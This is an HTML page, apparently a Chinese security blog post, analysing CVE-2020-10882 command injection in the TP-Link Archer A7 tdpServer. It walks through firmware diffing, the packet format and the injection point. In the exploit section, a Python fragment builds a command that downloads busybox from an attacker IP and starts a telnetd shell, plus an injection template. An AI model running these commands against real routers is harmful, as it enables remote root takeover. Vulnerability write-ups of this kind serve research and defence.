@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+<meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="本文详细分析了TP-Link Archer A7路由器中的CVE-2020-10882漏洞，该漏洞存在于tdpServer服务中，允许攻击者通过特制的UDP数据包实现远程代码执行。文章涵盖了从固件分析、逆向工程到最终漏洞利用的全过程。">
+<title>TP-Link Archer A7漏洞分析与利用：从逆向工程到远程代码执行</title>
+
+<link rel='canonical' href='http://localhost:1313/p/tp-link-archer-a7%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8%E4%BB%8E%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/'>
+
+<link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="TP-Link Archer A7漏洞分析与利用：从逆向工程到远程代码执行">
+<meta property='og:description' content="本文详细分析了TP-Link Archer A7路由器中的CVE-2020-10882漏洞，该漏洞存在于tdpServer服务中，允许攻击者通过特制的UDP数据包实现远程代码执行。文章涵盖了从固件分析、逆向工程到最终漏洞利用的全过程。">
+<meta property='og:url' content='http://localhost:1313/p/tp-link-archer-a7%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8%E4%BB%8E%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/'>
+<meta property='og:site_name' content='办公AI智能小助手'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='漏洞分析' /><meta property='article:tag' content='路由器安全' /><meta property='article:tag' content='逆向工程' /><meta property='article:tag' content='CVE-2020-10882' /><meta property='article:published_time' content='2025-08-07T06:02:51&#43;08:00'/><meta property='article:modified_time' content='2025-08-07T06:02:51&#43;08:00'/>
+<meta name="twitter:title" content="TP-Link Archer A7漏洞分析与利用：从逆向工程到远程代码执行">
+<meta name="twitter:description" content="本文详细分析了TP-Link Archer A7路由器中的CVE-2020-10882漏洞，该漏洞存在于tdpServer服务中，允许攻击者通过特制的UDP数据包实现远程代码执行。文章涵盖了从固件分析、逆向工程到最终漏洞利用的全过程。">
+
+
+<script
+  async
+  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"
+></script>
+<meta name="referrer" content="no-referrer-when-downgrade" />
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-ECH1V9TWJT"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-ECH1V9TWJT');
+        }
+      </script>
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_f509edb42ecc0ebd.png" width="234"
+                            height="170" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">办公AI智能小助手</a></h1>
+            <h2 class="site-description">qife的个人博客</h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#制作数据包">制作数据包</a></li>
+    <li><a href="#命令注入">命令注入</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/tp-link-archer-a7%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8%E4%BB%8E%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">TP-Link Archer A7漏洞分析与利用：从逆向工程到远程代码执行</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            本文详细分析了TP-Link Archer A7路由器中的CVE-2020-10882漏洞，该漏洞存在于tdpServer服务中，允许攻击者通过特制的UDP数据包实现远程代码执行。文章涵盖了从固件分析、逆向工程到最终漏洞利用的全过程。
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Aug 07, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 3 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="环境搭建">环境搭建
+</h1><p>调试和分析主要在路由器环境中进行。通过USB-TTL设备获取路由器交互式shell的方法已有相关指南，这里不再赘述。OpenWRT提供了<a class="link" href="%e9%93%be%e6%8e%a51" >指南1</a>和<a class="link" href="%e9%93%be%e6%8e%a52" >指南2</a>说明具体操作。</p>
+<p>对于代码分析，采用了bindiff方法来定位漏洞函数。可从以下链接下载有漏洞和已修复的固件版本：</p>
+<ul>
+<li>修复版本：Archer A7(US)_V5_200220</li>
+<li>漏洞版本：Archer C7(US)_V5_190726</li>
+</ul>
+<p>注意Archer C7和A7型号共享大多数二进制文件，因此分析C7或A7固件镜像均可。</p>
+<h1 id="bindiff分析">BinDiff分析
+</h1><p>首先从固件中提取MIPS(Big Endian)二进制文件并加载到Ghidra中。按照<a class="link" href="%e9%a1%b9%e7%9b%ae%e9%93%be%e6%8e%a5" >BinDiffHelper项目</a>的说明进行操作，同时下载安装bindiff6。</p>
+<p>使用Ghidra和Bindiff后，发现几个相似度很低的函数。跟踪这些地址发现，FUN_00414D14似乎指向一个函数，这可能是存在漏洞的函数。</p>
+<h1 id="静态分析">静态分析
+</h1><p>根据ZDI网站上的CVE报告描述，漏洞存在于默认监听UDP端口20002的tdpServer服务中。当解析slave_mac参数时，该服务未正确验证用户输入的字符串就直接用于执行系统调用。</p>
+<p>在反编译代码中搜索slave_mac字符串，发现多个结果。第一个搜索结果中，有多个地方包含slave_mac字符串，其中还包括对FUN_00414d14函数的引用。</p>
+<p>关键的字符串&quot;tdpUciInterface.c:644&quot;,&ldquo;About to get slave mac %s info&quot;只有一处引用，地址为0x40e7e4。根据Bindiff，这里很可能没有变化或差异。</p>
+<h1 id="寻找system调用">寻找system()调用
+</h1><p>根据CVE描述，我们需要寻找攻击者可能控制的system()函数调用。在FUN_00414d14函数中发现了三个system调用，其中一个特别有趣：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">snprintf</span><span class="p">(</span><span class="n">interesting_acStack7432</span><span class="p">,</span><span class="mh">0x1ff</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s">&#34;lua -e </span><span class="se">\&#39;</span><span class="s">require(</span><span class="se">\&#34;</span><span class="s">luci.controller.admin.onemesh</span><span class="se">\&#34;</span><span class="s">).sync_wifi_specified({mac=</span><span class="se">\&#34;</span><span class="s">%s</span><span class="se">\&#34;</span><span class="s">})</span><span class="se">\&#39;</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">,</span> <span class="n">to_be_controlled_acStack4248</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="漏洞利用">漏洞利用
+</h1><p>在这个漏洞函数中，slave_mac值可以控制传递给system()的参数。我们可以通过以下步骤实现利用：</p>
+<ol>
+<li>为MIPS Big Endian设置GDB服务器</li>
+<li>测试与tdpServer的连接</li>
+<li>制作有效载荷</li>
+<li>完整漏洞利用</li>
+</ol>
+<h2 id="制作数据包">制作数据包
+</h2><p>数据包由16字节的包头和最大0x410字节的JSON有效载荷组成。第一个字节表示tdp版本，这个固件只接受版本1的数据包。</p>
+<p>数据包校验和计算使用CRC-32算法。校验通过后，有效载荷会使用IV和DecryptKey通过AES_DECRYPT在CBC模式下解密。</p>
+<h2 id="命令注入">命令注入
+</h2><p>slave_mac字段用于将字符写入文件p。该字段有17个字符的限制。命令注入工作原理如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-lua" data-lang="lua"><span class="line"><span class="cl"><span class="n">lua</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;require(&#34;luci.controller.admin.onemesh&#34;).sync_wifi_specified({mac=&#34; &#39;</span><span class="p">;</span><span class="n">INJECT</span> <span class="n">HERE</span><span class="p">;</span><span class="s1">&#39; &#34;})&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们使用printf将字符追加到文件中，通过发送多个数据包构建完整脚本后执行。</p>
+<h1 id="完整漏洞利用">完整漏洞利用
+</h1><p>要实现反向shell，可以从我们的机器下载busybox，然后使用telnetd获取反向shell，通过wget命令逐个字符写入文件并执行。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">zlib</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ATTACKERIP</span> <span class="o">=</span> <span class="s2">&#34;192.168.0.125&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">ATTACKPORT</span> <span class="o">=</span> <span class="s2">&#34;8090&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">fileName</span> <span class="o">=</span> <span class="s2">&#34;m&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">COMMAND</span> <span class="o">=</span> <span class="s2">&#34;wget http://&#34;</span><span class="o">+</span><span class="n">ATTACKERIP</span><span class="o">+</span><span class="s2">&#34;:8000/busybox-mips -P /tmp;chmod +x /tmp/busybox-mips;/tmp/busybox-mips telnetd -l /bin/sh -p &#34;</span><span class="o">+</span><span class="n">ATTACKPORT</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span> <span class="o">+</span> <span class="n">ATTACKERIP</span> <span class="o">+</span> <span class="s2">&#34;;wget http://&#34;</span> <span class="o">+</span><span class="n">ATTACKERIP</span><span class="o">+</span><span class="s2">&#34;:8000/index.jpg -P /www;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">完整Python利用代码</span><span class="o">...</span><span class="p">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>该漏洞允许攻击者在root用户上下文中执行任意代码，危害极大。建议用户及时更新固件版本。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
+        
+            <a href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/">路由器安全</a>
+        
+            <a href="/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/">逆向工程</a>
+        
+            <a href="/tags/cve-2020-10882/">CVE-2020-10882</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+
+
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2025 qife
+    </section>
+    
+    <section class="powerby">
+        
+
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+
+            
+
+    <div class="busuanzi-footer">
+      <span id="busuanzi_container_site_pv">
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+      </span>
+      <span id="busuanzi_container_site_uv">
+        本站访客数<span id="busuanzi_value_site_uv"></span>人次
+      </span>
+    </div>
+
+    </section>
+
+    
+
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.313ab02d2f8415261a3718a5b3d0e35b62826b81a7f2c46c8122082f4cba0bcf.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
